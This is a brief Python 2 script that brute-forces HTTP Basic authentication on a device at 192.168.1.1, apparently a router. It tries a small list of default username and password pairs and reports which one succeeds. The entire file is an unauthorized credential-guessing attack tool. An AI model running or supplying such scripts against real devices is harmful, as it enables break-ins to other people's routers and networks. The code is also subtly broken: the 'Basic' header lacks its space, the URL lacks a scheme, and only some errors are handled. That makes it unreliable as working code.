#coding:utf-8
import base64
import urllib2

password_dic = [["root", "root"], ["admin","admin"], ["admin", "rootroot"]]
# Package: Authorization  Basic  encode(name:psw)
request = urllib2.Request('192.168.1.1')
for item in password_dic:
	psw_base64 = "Basic" + base64.b64encode(item[0] + ":" + item[1])
	request.add_header('Authorization', psw_base64)
	try:
		response = urllib2.urlopen(request)
		print("Correct username:%s, password:%s" % (item[0], item[1]))
		break
	except urllib2.HTTPError:
		print("Error!")
